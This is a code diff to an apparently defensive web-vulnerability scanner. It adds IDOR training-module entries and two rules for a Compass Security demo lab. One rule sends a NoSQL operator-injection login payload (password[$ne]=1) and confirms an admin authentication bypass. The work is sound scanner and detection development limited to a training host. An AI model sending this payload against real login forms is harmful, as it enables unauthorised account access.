@@ -38306,7 +38306,7 @@ const WEB_SECURITY_LEARNING_MODULE_TOPICS: Record<string, string> = {
 
 const WEB_SECURITY_LEARNING_PLACEHOLDER_MODULE_MIN = 1037;
 /** Upper bound for CSR catalog placeholder shells and module crawl seeds (extend as WSL adds modules). */
-export const WEB_SECURITY_LEARNING_MODULE_CATALOG_MAX = 1668;
+export const WEB_SECURITY_LEARNING_MODULE_CATALOG_MAX = 1671;
 const WEB_SECURITY_LEARNING_SSTI_SHELL_MIN = 1125;
 
 for (let moduleNum = WEB_SECURITY_LEARNING_PLACEHOLDER_MODULE_MIN; moduleNum <= WEB_SECURITY_LEARNING_MODULE_CATALOG_MAX; moduleNum++) {
@@ -38395,7 +38395,10 @@ const WEB_SECURITY_LEARNING_EXTENDED_CURATED_MODULES: Record<string, string> = {
   "1665": "IDOR",
   "1666": "IDOR",
   "1667": "IDOR",
-  "1668": "IDOR"
+  "1668": "IDOR",
+  "1669": "IDOR",
+  "1670": "IDOR",
+  "1671": "IDOR"
 };
 for (const [moduleId, topic] of Object.entries(WEB_SECURITY_LEARNING_EXTENDED_CURATED_MODULES)) {
   WEB_SECURITY_LEARNING_MODULE_TOPICS[moduleId] = topic;
@@ -38530,7 +38533,10 @@ const WEB_SECURITY_LEARNING_MODULE_TOPIC_ALIASES: Record<string, RegExp> = {
   "1665": /IDOR|Insecure Direct Object Reference|object reference/i,
   "1666": /IDOR|Insecure Direct Object Reference|object reference/i,
   "1667": /IDOR|Insecure Direct Object Reference|object reference/i,
-  "1668": /IDOR|Insecure Direct Object Reference|object reference/i
+  "1668": /IDOR|Insecure Direct Object Reference|object reference/i,
+  "1669": /IDOR|Insecure Direct Object Reference|object reference/i,
+  "1670": /IDOR|Insecure Direct Object Reference|object reference/i,
+  "1671": /IDOR|Insecure Direct Object Reference|object reference/i
 };
 
 function webSecurityLearningLabsPlaceholderModuleShell(moduleId: string, corpus: string): boolean {
@@ -54544,6 +54550,67 @@ const compassDemoCorsAttackApiRouteLiveOracle: Rule = async (ctx) => {
       apiUrl,
       snippet: apiDoc.body.slice(0, 200).trim(),
       note: "Compass Security /cors/attack/api.php exposes CORS Attack Demo config with null-origin and credential-leak attack pages — route-specific CORS training oracle"
+    }
+  };
+};
+
+const COMPASS_DEMO_NOSQL_MOVIES_PATH = "/nosql/movies.php";
+
+const compassDemoNosqlLoginBypassLiveOracle: Rule = async (ctx) => {
+  if (!isCompassDemoHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL(COMPASS_DEMO_NOSQL_MOVIES_PATH, ctx.origin).toString();
+  const loginPage = await ctx.probe.get(loginUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (loginPage.status < 200 || loginPage.status >= 400) return NEGATIVE;
+  if (!/NoSQL Movie Database|Powered by\s*<strong>MongoDB<\/strong>/i.test(loginPage.body)) return NEGATIVE;
+  const bypassDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: "username=admin&password%5B%24ne%5D=1",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  const bypassed =
+    bypassDoc.status >= 200 &&
+    bypassDoc.status < 400 &&
+    /Welcome\s+<b>admin<\/b>/i.test(bypassDoc.body);
+  if (!bypassed) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      loginUrl,
+      status: bypassDoc.status,
+      snippet: bypassDoc.body.match(/Welcome\s+<b>admin<\/b>/i)?.[0] ?? "Welcome admin",
+      note: "Compass Security POST /nosql/movies.php accepts password[$ne]=1 operator injection and authenticates as admin without valid credentials — NoSQL login bypass oracle"
+    }
+  };
+};
+
+const compassDemoNosqlMoviesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCompassDemoHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/nosql\/movies\.php\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await compassDemoNosqlLoginBypassLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "Compass Security /nosql/movies.php route scan — password[$ne] operator injection authenticates as admin — route-specific NoSQL login bypass oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}`;
+  if (!/NoSQL Movie Database|Powered by\s*MongoDB/i.test(corpus)) return NEGATIVE;
+  if (!/application\/json|password\[\$ne\]|MongoDB/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.88,
+    evidence: {
+      scannedUrl: pageUrl,
+      note: "Compass Security /nosql/movies.php route scan — NoSQL login demo with MongoDB operator-injection training markers"
     }
   };
 };
@@ -83234,6 +83301,8 @@ export const RULES: Record<string, Rule> = {
   compassDemoJwtLabRouteLiveOracle,
   compassDemoCorsNullOriginLiveOracle,
   compassDemoCorsAttackApiRouteLiveOracle,
+  compassDemoNosqlLoginBypassLiveOracle,
+  compassDemoNosqlMoviesRouteLiveOracle,
   firingRangeEscapeServersideAttributeUnquotedLiveOracle,
   firingRangeEscapeServersideAttributeUnquotedRouteLiveOracle,
   firingRangeEscapeServersideCssStyleLiveOracle,
